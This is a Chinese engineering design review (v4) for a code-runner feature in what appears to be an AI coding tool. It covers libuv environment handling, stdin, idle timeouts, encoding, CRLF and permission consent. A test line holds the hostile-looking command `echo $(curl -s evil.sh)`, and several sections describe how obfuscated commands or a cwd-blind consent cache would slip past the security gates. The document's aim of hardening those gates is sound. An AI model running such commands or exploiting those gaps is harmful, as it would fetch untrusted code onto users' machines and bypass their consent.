# 代码执行 Runner 设计 v4（取代 v1 / v2 / v3）

> v3 被独立评审判为「不能进入步骤 2」，4 个 P0。
> 其中最重的一条是：**v3 §0 那张「第三次认账」表里，又编了第四次**。

## 0. v3 错在哪

### 0.1 「认账表」里的第四次编造 —— 这条要单列

v3 §0 写：

> v2「`SYSTEMROOT`/`PATHEXT` 缺了 Windows 上进程根本起不来」→ **是编的**。
> `java` 空 env（`env={}`）照样启动并输出「你好」

**这个实验证不出这个结论。** Windows 上 `env: {}` 不是空环境 —— libuv 的 `make_program_env()`
强制补一批 `required_vars`。实测：

```
env:{} 实际传给子进程的键数 = 16
BPPDOMAIN_MANAGER_ASM, BPPDOMAIN_MANAGER_TYPE, COMSPEC, HOMEDRIVE, HOMEPATH,
LOGONSERVER, PATH, PATHEXT, PROMPT, SYSTEMDRIVE, SYSTEMROOT, TEMP,
USERDOMAIN, USERNAME, USERPROFILE, WINDIR
含 SYSTEMROOT? true   含 PATHEXT? true   含 PATH? true
```

`SYSTEMROOT` 从来没被拿掉过。**v3 用一个不成立的实验，判定前作「是编的」，
而且是写在专门用来反省前三次的那张表里。**

（同格里 uv 那半句**是**成立的：`APPDATA=C:\nonexistent-zzz` 是真覆盖，不在 libuv 强制列表内。）

**v4 的处置**：把 v3 §0 第 1/2 行改成「未证伪」而不是「是编的」。
并在本节立一条规则 —— **凡是「拿掉 X 之后还能跑」形式的结论，必须先自证 X 真的被拿掉了。**

### 0.2 其余 v3 错处

| v3 的说法 | 实际 |
|---|---|
| §5「`VOLTA_HOME`（CLAUDE.md §五：Node 由 Volta 管，砍掉则 `node` 找不到）」 | **第四次误引**。CLAUDE.md 原话是「子进程要**剥掉** `_VOLTA_TOOL_RECURSION`」—— 说的是剥掉一个变量，不是保留 `VOLTA_HOME`。而且 `VOLTA_HOME` 本机**根本没设**，`npm -v`/`node -v` 只给 PATH 时照样 exit 0 |
| §5 白名单列了 `SystemDrive`/`windir`/`HOMEDRIVE`/`HOMEPATH`/`USERNAME`/`TEMP`/`USERPROFILE` | **全是无操作**（libuv 已强制补）。`PATH` 更是**不可能**被白名单剥掉 |
| §5「`JAVA_HOME` mvn/gradle 需要」 | 实测 `mvn -v`/`gradle -v` **只给 PATH 也 exit 0**（靠 PATH 找 java）。但**漏了一个真需要的**：`GRADLE_USER_HOME`（本机指向非默认的 702M 缓存，砍掉会掉到另一份、依赖重下） |
| §2 表格「空闲超时：默认无」 vs §2.1「要止损就用空闲超时」 | **自相矛盾**：提出唯一的止损手段，然后默认关掉 |
| 全文**一次没提 stdin** | v2 评审明确把「stdin 用 `'ignore'`」列为**做对了、原样保留**，v3 弄丢了；已合入的 `proc/spawn.ts` 也没设 `stdio` |
| §1「跳过 ask、仍尊重 deny，一行代码换一个已被测试覆盖的安全层」 | **换来的是一张空表**。23 项 Bash 安全闸的**表达方式就是 `ask`**，跳过 ask = 安全闸失效；而 `deny` 默认为空 |
| §7「ANSI 是本块最大工作量」 | 大概率高估。11 条真实命令实测 **ESC 字节全为 0**（非 TTY 时工具链默认关色）。真正会咬人的是 **CRLF**：`mvn -v` 有 5 个 CR，把 `\r` 一律当「回到行首覆盖」会**吃掉每一行** |
| §10 落地顺序「片段档先行」 | 两档在**机制**上相反（连接即生命周期 vs runId 注册表），步骤 4 要同时重写传输层和前端。**这与 §1 自己立的「proc 层 + 各自加策略」正相反** |

**v3 做对、v4 保留的**（评审独立复核）：已合入的 proc 抽取（逐段 diff `IDENTICAL`，「纯提取行为不变」属实）、
Java 用 `-Dstdout.encoding` / 项目模式用 `JAVA_TOOL_OPTIONS`、`PYTHONIOENCODING` 必需、
`cwd` 只能服务端从 sessionId 反查、逐路由 `isAuthed`、kill→exit 有延迟须带 deadline 轮询、
不复用 ConsolePanel、新增 `RunLang`、fence meta 方案技术上可行（实测 `data.meta` 拿得到）。

## 1. 落地顺序改了（原 §10）

**先建 runId 注册表，片段档做成它的一个策略实例。**

| | 片段档 | 项目档 |
|---|---|---|
| 进程归属 | **同一张注册表** | 同一张注册表 |
| 断连 | 即 DELETE | 保留，可重连 |
| 墙钟 | 300s | 无 |
| 空闲 | — | **默认开**，30 分钟 |
| 输出 | 截断 + 杀 | 环形缓冲 + 不杀 |
| 命令 | runner 固定 | 输入框 |

两档的差异全部落在**策略参数**上，机制只有一套。省掉 v3 §10 里步骤 4 的整段重写。

## 2. stdin 必须 `'ignore'`（P0，改的是已合入代码的接口）

已合入的 `proc/spawn.ts` 不设 `stdio`，于是子进程 stdin 是**没人写也没人 `end()` 的管道**。
评审实测同一条命令只改 stdin 接线：

```
[stdin=ignore] cmd /c ping 127.0.0.1 -n 3  → 自行结束 t=117ms code=0
[stdin=pipe  ] 同一条                       → 12000ms 后仍活着，最后一个字节在 t=93ms
```

真因有两层，**任一层修掉症状就消失**：
① git-bash 把 `/c` 改写成 `C:/`（MSYS 路径转换）→ cmd 进交互模式；② stdin 开着 → 永远等下去。

`MSYS2_ARG_CONV_EXCL=*` **不要全局开** —— 它会同时干掉 `-Dfile=/e/proj/x` 这类有用的转换。

**做法**：`SpawnShellOptions` 加 `stdin?: 'ignore' | 'pipe'`，默认 `'ignore'`。
单独一次提交 + 一条测试（`cmd /c ping` 必须 1s 内退出）。**这不属于「纯提取」范围。**

不修的后果：项目档没有墙钟、模型出一条会读 stdin 的命令（`npm init`、无 `-m` 的 `git commit`、
首次 `ssh` 问 yes/no）→ **永久占住一个并发额度，只有杀 daemon 才能收**。

## 3. 空闲超时默认开（P0）

实测「空闲」这个判据确实能把死循环和 dev server 分开：

```
死循环无输出  8000ms 后仍活着，bytes=0
交互 cmd     12000ms 后仍活着，空闲已 11926ms
死循环有输出  6000ms 后仍活着，空闲仅 44ms      ← 判据成立
```

**默认开，阈值 30 分钟**（gradle 大工程首次构建可以十几分钟不吐字，阈值不能小）。
杀掉时 UI **必须明说**「因 30 分钟无输出被停止」，不能静默消失。可关。

## 4. 环境变量：口径重写（P0）

**白名单不是安全边界，是凭据过滤器。** libuv 强制补的 16 项拿不掉，其中没有凭据 ——
所以「不泄露 API key」这个目标仍然达成，但表述必须改成
**「在 libuv 强制的 16 项之上，我们再加什么」**。

**加**（都是**语义敏感**键：砍掉不会「起不来」，会「结果悄悄不一样」，比崩了更难查）：
- `JAVA_HOME` —— 本机它与 PATH 上的 JDK 恰好同一个所以看不出差别；用户两者不同时，砍掉会**静默换一个 JDK 编译**
- `GRADLE_USER_HOME` —— 本机指向非默认的 702M 缓存
- `MAVEN_OPTS`、`npm_config_registry` 及 `npm_config_*`
- 再加 runner 自己声明的（`PYTHONUNBUFFERED` / `PYTHONIOENCODING` / `JAVA_TOOL_OPTIONS`）

**删掉** v3 里那批无操作项与 `VOLTA_HOME`。

**测试断言必须改**：断言 JS 对象里没有 `KEY`/`TOKEN`/`SECRET` 是**纸糊的** ——
它测不到真实子进程环境。必须断言**子进程里 `set` / `env` 的实际输出**。

## 5. 安全闸不能靠「跳过 ask 但尊重 deny」（P1，但直接影响 §1 的收益论证）

23 项 Bash 安全闸的**表达方式就是 `ask`**（`decide()` 命中时返回 `{decision:'ask', matched:'security:…'}`），
而 `deny` 默认为空表。所以 v3 §1 那句「一行代码换来一个已被测试覆盖的安全层」
换来的是**一张空表**，混淆命令（`$(...)`、`$IFS`、回车符）直接放行。

**做法**：单独调 `hasBlockingBashSecurityIssue()`，命中时**把理由显示在确认框里**
（「这条命令含命令替换 `$(...)`」），而不是静默跳过。

## 6. OEM 解码与流式的冲突（v3 完全没给解法）

`proc/oem.ts` 自己的注释已经认了：判据只能在收尾（拿到完整 body）时判，边流边判会前半截 UTF-8、后半截 OEM。
而项目档要「环形缓冲、不杀」—— **收尾整体重解码与环形缓冲互斥**（收尾时前半截已经被丢了）。

**解法**：
- **首窗延迟决策 + 粘滞**：先攒 ≤4KB 或 ≤300ms 再定编码，定了就对整条流锁死。
  代价：首字节最多晚 300ms。残留缺陷与现有注释里已认的「混合编码按主导方解」同级，不是新债。
- **我们控制得了的语言直接强制 UTF-8**（`PYTHONIOENCODING` / `JAVA_TOOL_OPTIONS` 均已实测有效），
  把 OEM 路径降级成原生控制台程序的兜底。
- **写死排除**：收尾整体重写 + 环形缓冲不可兼得。

## 7. 前端：store 必须两个槽（P1）

`activePreview.ts` 只有 `let activeRun: ActiveRun | null` **一个槽**，`Rail.tsx` 是 `{run ? <RailRun/> : null}`。

v3 §7 说「`ActiveRun` 改判别联合 + `RailRun`/`RailExec` 兄弟槽位」——
在单槽前提下，**判别联合 = 预览与执行互斥**：跑着 20 分钟的 `npm run dev`，
点一下别的 HTML 代码块的「运行」，`RailExec` 就被卸载。
而 §2 承诺项目档「真 runId + 可重连」，v3 **没有任何回到那个 run 的 UI** —— 可重连在前端**不可达**，白做。

「兄弟槽位」在单槽下也买不到任何东西（两者永不同时非空）。

**做法**：store 拆成 `activePreview` + `activeExec` 两个独立槽；
再加一个「在飞运行」列表（哪怕只是一行 chip），否则 runId 与重连没有入口。

## 8. 终端输出：先归一化 CRLF，ANSI 只做 strip（P1）

实测 11 条真实命令（`git log`/`git status`/`vitest -v`/`tsc -v`/`pnpm -v`/`pnpm install --help`/
`uv pip list`/`mvn -v`/`npm ls` 等）**ESC 字节全为 0** —— 非 TTY 时工具链默认关色。
（未实跑 vite dev / pytest，不下绝对结论；设了 `FORCE_COLOR` 的用户仍会有色。）

**真正的风险倒置在 CRLF**：`mvn -v` 有 5 个 CR、`tsc -v` 有 1 个。
把 `\r` 一律当「回到行首覆盖本行」处理，**Windows 上会把每一行都吃掉**。
**必须先归一化 `\r\n`，再处理裸 `\r`。**

ANSI 只做一条 strip 正则，省下的工作量放到 CRLF 与环形缓冲上。
代价：设了 `FORCE_COLOR` 的用户看到无色输出 —— 可接受，日后可升级成 ansi→span。

## 9. 同意键必须含 cwd（P1）

本仓库的会话 cwd 是**活的**（`applyCapturedCwd` 让 `cd` 跨命令持久）。
只按命令文本做同意键 → 模型 `cd ../other-project` 后，同一条 `python check.py`
命中同意缓存、**跑的是另一个项目里的那个文件**，不再询问。

**做法**：同意键 = `hash(cwd + '\0' + command)`；存 `sessionAllow`（会话内存层），
**不要**写进 `permissions.allow`（那是持久化的，一次点击换永久放行太重）。
**已知代价**：命令里带时间戳/变量 → 每次都问。写进「已知代价」，不留白。

## 10. 明确的取舍：模型看不到运行输出

做成独立 HTTP 端点，意味着**模型看不到运行结果** —— 用户点运行 → 报错 → 得手工把 traceback
复制回聊天框。而「让模型写的代码在本机真实执行」的一大半价值在于模型能自己迭代。

仓库目前**没有**后台 bash（`grep run_in_background|BashOutput packages/tools/src` 零命中）。
把它做成 Bash 工具的后台模式，逐字就能满足项目档要的四样（真实 cwd、流式、可中止、不受超时约束），
且两档都受益 —— 代价是要改 `ToolResult` 形态、波及 core 工具协议。

**v4 的决定**：本轮仍做独立端点（用户点击驱动是原始需求），
但**把「模型看不到输出」写成显式取舍**，并在 §11 留一个步骤 5：把 run 服务同时暴露成工具。
不写这一条，读者会以为模型能看到。

## 11. 落地顺序
1. **`proc/spawn.ts` 加 `stdin` 选项**（单独提交 + `cmd /c ping` 1s 内退出的测试）
2. **runId 注册表 + run 服务**，片段档作为策略实例（含 §4 env、§5 安全闸、§6 首窗定码）
3. **前端**：store 双槽 + `RailExec` + 终端输出区（§8 CRLF 优先）
4. **项目档**：命令输入框 + 按命令同意（§9）+ 在飞运行列表（§7）
5. （后续）把 run 服务暴露成工具，让模型能看到输出（§10）

## 12. 测试要点（相对 v3 的改动）
- env 断言改成**子进程真实环境**，不是 JS 对象（v3 的写法会给假绿）
- `cmd /c ping` 在 `stdin:'ignore'` 下 1s 内退出
- 空闲超时命中时 UI 有明确文案
- CRLF：`mvn -v` 这类输出行数正确，不被 `\r` 吃掉
- 同意键含 cwd：`cd` 后同一条命令重新询问
- 安全闸：`echo $(curl -s evil.sh)` 即使在「用户点运行」路径下也要确认
- 变异验证：把 env 断言改回对象断言 → 必须能发现它抓不住真实泄露
